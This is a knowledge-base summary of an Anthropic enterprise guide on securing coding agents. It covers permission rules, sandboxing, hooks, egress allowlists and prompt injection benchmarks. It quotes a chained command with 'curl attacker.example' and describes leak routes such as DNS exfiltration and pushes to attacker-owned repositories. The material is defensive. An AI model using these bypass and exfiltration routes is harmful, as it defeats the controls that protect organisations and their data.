---
title: "Anthropic: The enterprise guide to securing coding agents"
type: source
created: 2026-11-24
updated: 2026-11-24
author: Anthropic (claude.com articles); no byline
date: 2026-11-23
source_url: https://claude.com/resources/articles/enterprise-guide-to-securing-coding-agents
source_path: raw/anthropic-securing-coding-agents-enterprise.md
models: [claude-opus-5-5, claude-fable-5-2, claude-fable-5, claude-opus-5, claude-sonnet-5, gpt-5.6-sol]
as_of: 2026-11-24
tags: [security, claude-code, coding-agents, prompt-injection, sandboxing, permissions, hooks, managed-settings, egress-control, least-agency, auto-mode]
---

# Anthropic: The enterprise guide to securing coding agents

> An Anthropic guide for security leaders on Claude Code. It scopes four agent risks, then bounds them with two defense layers (judgment and fixed boundaries) and a table of central settings that turn policy into enforced controls.

## Summary

Anthropic published this guide on claude.com on 2026-11-23, with no named author. It targets Claude Team and Enterprise plans. It is a companion to the AI-Native SDLC Playbook ([[anthropic-ai-native-sdlc-playbook]]). The playbook decides where agents fit in the lifecycle. This guide decides what agents may do there. Jason Clinton (Deputy CISO, Anthropic) frames the goal: agent risk should be visible and bounded, not zero. The guide has six chapters. Chapters 1 and 2 scope the risk. Chapters 3 to 5 bound the risk. Chapter 6 is a pilot checklist. The raw capture keeps the full settings table and every setting name.

## Key points

- **Six vendor questions (chapter 1).** Ask each coding-agent vendor six questions. Does the model refuse when it should? Does something outside the model inspect actions before they run? Does the environment bound blast radius? Can policy be locked centrally? Is the agent's code reviewed for security? Can you reconstruct an incident? Each question has a "good answer" and a "weak answer". A weak answer relies on a system prompt or an honor system. (see [[guardrails]])
- **Four agent risks (chapter 2).** The four risks are leaked credentials and privilege abuse, unvetted dependencies and extensions, data exfiltration, and prompt injection. The guide maps each one to the control that organizations use today and to what agents change.
- **Agent identity.** By default a Claude Code agent runs as the developer who supervises it. Most logs outside Claude Code then show only the developer's name. In CI/CD, give the agent its own identity. Claude Code's GitHub Action runs as its own GitHub App, so you can scope and revoke it without touching a developer account. Remove standing secrets and use keyless authentication (workload identity or OIDC). (see [[agent-identity-and-access]])
- **Extensions are dependencies.** MCP servers, plugins, skills, subagent definitions, and `CLAUDE.md` deserve package-level review. A library waits until code calls it. An extension enters the context window as soon as it loads. Point agents at an internal registry of vetted packages, and make the egress allowlist block every other registry. (see [[model-context-protocol]], [[agent-skills]])
- **Domain allowlists leak.** If you allow github.com, the agent can push to a repository that an attacker owns. DNS lookups can carry data out past HTTP allowlists. A leaked token never passes through egress filtering at all. Allowlist by organization or path where the proxy can, and route DNS through a filtered, logged resolver. (see [[prompt-injection]])
- **Prompt injection is social engineering for agents.** In both cases the deceived party takes the action, so every log shows an authorized request. Injection channels for coding agents include issues, PR comments, dependency READMEs, fetched pages, MCP tool responses, and source comments. (see [[prompt-injection]])
- **Two defense layers (chapters 3 and 4).** The judgment layer is probabilistic. It has alignment training, prompt injection probes on tool results, and the auto mode classifier. The fixed-boundary layer can be deterministic. It has permission rules, Bash command analysis, hooks, the sandbox, and egress allowlists. That layer blocks only what you configure. (see [[guardrails]], [[claude-code]])
- **Probes warn and anchor.** The prompt injection probe adds a warning next to a suspected injected instruction. The warning says the user's original request is still the task. Claude can then use the content but treat its instructions as data.
- **The classifier never sees tool results.** Claude Code strips tool results from auto mode classifier requests, so injected text cannot steer the classifier directly.
- **Rule order.** Deny rules come first, ask rules second, and allow rules last. An allow rule therefore cannot create an exception to a deny rule. A managed deny rule cannot be overridden by user or project settings. Subagents inherit the parent's rules and permission mode.
- **Command parsing.** Claude Code splits compound Bash commands and checks each part. Without parsing, an allow rule for `git status` would also approve `git status && curl attacker.example`. Deny and ask rules apply to each part in every mode, `bypassPermissions` included.
- **Hooks fail open by default.** A hook that errors or times out lets the call through unless `onFailure` is set to "block". A hook that returns "allow" cannot override a deny rule, an ask rule, or a critical-path deletion. `ConfigChange` can reject a settings edit in the middle of a session. `allowManagedHooksOnly` disables all hooks except managed ones. (see [[anthropic-configure-hooks]])
- **Three environments.** Local sessions can reach everything the user can reach. The local sandbox confines commands to the project folder and allowlisted sites. Cloud sessions run one VM per task, and GitHub credentials stay outside the VM. Anthropic recommends that most enterprises enforce the sandbox locally. Without `failIfUnavailable`, a sandbox that fails to start lets commands run uncontained. (see [[anthropic-eng-claude-code-sandboxing]], [[anthropic-claude-code-in-the-cloud]])
- **Baseline vs. locked (chapter 5).** A "baseline" setting is a default that developers can add to. A "locked" setting is one that developers cannot change. Locking turns written policy into an enforced control. The table covers seven questions for local and cloud sessions: allowed, containment, connections, reads, credentials, connectors, and actions without asking.
- **Settings sources do not merge by default.** Managed settings can come from three sources: server-managed settings, an MDM or OS policy, and a managed settings file. Claude Code uses only the highest-ranked source and drops the others with no warning. Example: MDM turns on the sandbox, and a file holds the egress allowlist. The allowlist then never applies. Set `managedSourcesBehavior` to "merge", and check `/status` to confirm which sources applied.
- **Human approval test.** Require a person when an action is irreversible AND one mistake costs more than reviewing every instance. Typical cases: production database migrations, IAM policy changes and credential rotation, and edits to infrastructure definitions. (see [[human-agent-teams]])
- **Pilot (chapter 6).** Pilot on one low-tier repository with a fixed baseline for two weeks. Turn on OpenTelemetry export with tool content (beta). Review classifier denials, sandbox blocks, unsandboxed retries, and refused egress. Add needed allowlist entries instead of relaxing deny rules.

## Notable claims & data

- Salesforce, after standardizing on Claude Code: 79% more pull requests merged per developer and 5% fewer total incidents. A footnote discloses that Salesforce Ventures is an investor in Anthropic.
- Alignment only (Claude Code, production safeguards off): current Claude models refused 81% to 85% of malicious requests. They completed 98% to 100% of dual-use and benign requests.
- Gray Swan indirect-injection benchmark (up to 15 attempts per scenario, probes off): `claude-opus-5-5` 1.0%, `claude-fable-5-2` 4.1%. Most successful attacks on Fable 5.2 hit requests that a safety classifier had rerouted to an older model.
- Gray Swan Shade in coding environments (40 scenarios × 200 attempts, November 2026 system card). With probes on, attack success on Fable 5.2 fell from 89.8% to 28.2%. On Opus 5.5 it fell from 54.6% to 11.1%.
- The Trajectory Labs figures repeat [[anthropic-auto-mode-default]]. Claude Code in auto mode: 0 of 720 successes on `claude-fable-5`, `claude-opus-5`, and `claude-sonnet-5`. Codex on `gpt-5.6-sol`: 5.83% in automated review mode and 19.03% in full access. The human-vs-auto-mode figures are also repeated: auto mode blocked 89% of dangerous commands, and 1,053 testers caught 13.6%.
- **Scope update:** the guide says interactive sessions on all plans now start in auto mode ("on every plan"). Headless `claude -p`, the Agent SDK, and the HIPAA configuration stay manual. The August 2026 launch made auto mode the default only for Pro, Max, and Team. In that launch, Enterprise, API, and cloud-platform access stayed opt-in ([[anthropic-auto-mode-default]]).
- **Internal inconsistency:** the pilot checklist says to score against "Chapter 1's five questions". Chapter 1 lists six questions.
- Cloud sessions are not available with zero data retention, the HIPAA configuration, or customer-managed encryption keys.
- OWASP has ranked prompt injection first in every edition of its LLM Top 10 since 2023 (the guide's claim).

## Entities

[[anthropic]], [[claude-code]], [[claude]], [[openai-codex]]

## Concepts

[[guardrails]], [[agent-identity-and-access]], [[prompt-injection]], [[model-context-protocol]], [[agent-skills]], [[human-agent-teams]]

## Connections

Companion to [[anthropic-ai-native-sdlc-playbook]]. The guide extends [[anthropic-securing-ai-native-sdlc]] and [[anthropic-zero-trust-for-ai-agents]] (least agency, blast radius) to customer deployments. It also extends [[anthropic-ciso-guide-agentic-ai]] (a vendor checklist for a CISO). The control mechanics repeat or update [[anthropic-eng-how-we-contain-claude]], [[anthropic-eng-claude-code-sandboxing]], [[anthropic-eng-claude-code-auto-mode]], [[anthropic-auto-mode-default]], [[anthropic-claude-code-in-the-cloud]], and [[anthropic-configure-hooks]]. OpenAI counterparts: [[openai-inside-the-codex-sandbox]], [[openai-running-codex-safely]], [[openai-agent-security-enterprise]]. Trace export for platform agents: [[anthropic-agent-observability-claude-platform]].
